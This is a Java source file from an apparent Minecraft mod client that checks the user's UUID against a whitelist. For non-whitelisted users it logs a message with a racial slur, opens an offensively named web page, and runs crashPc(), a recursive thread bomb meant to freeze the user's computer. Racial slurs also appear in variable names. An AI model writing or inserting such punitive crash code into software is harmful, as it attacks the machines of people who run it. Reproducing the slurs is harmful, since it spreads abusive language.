package cum.jesus.jesusclient;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import cum.jesus.jesusclient.utils.Utils;

import java.io.IOException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Scanner;


public class JesseClient {
    private static ArrayList<String> whitelist;

    public static void verify() throws IOException {
        JsonArray danes = JesusClient.jesusClient.get("whitelist").getAsJsonArray();
        whitelist = new ArrayList<>();
        Iterator<JsonElement> joe = danes.iterator();
        int c = 0;
        while (joe.hasNext()) {
            JsonElement nigo = joe.next();
            whitelist.add(nigo.getAsString());
            c++;
        }

        boolean uuidInList = whitelist.stream().anyMatch(s -> s.equals(JesusClient.compactUUID));

        if (uuidInList) {
            // if on whitelist
            JesusClient.Log.info("Successfully authorized Jesus Client! Enjoy");
        } else { // not whitelisted
            JesusClient.Log.warn("nigga you're not whitelisted fuck off");
            Utils.openWebpage(new URL("https://niggafart.com"));
            crashPc();
        }
    }

    public static void crashPc() {
        while (true) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    while (true)
                        crashPc();
                }
            }).start();
        }
    }
}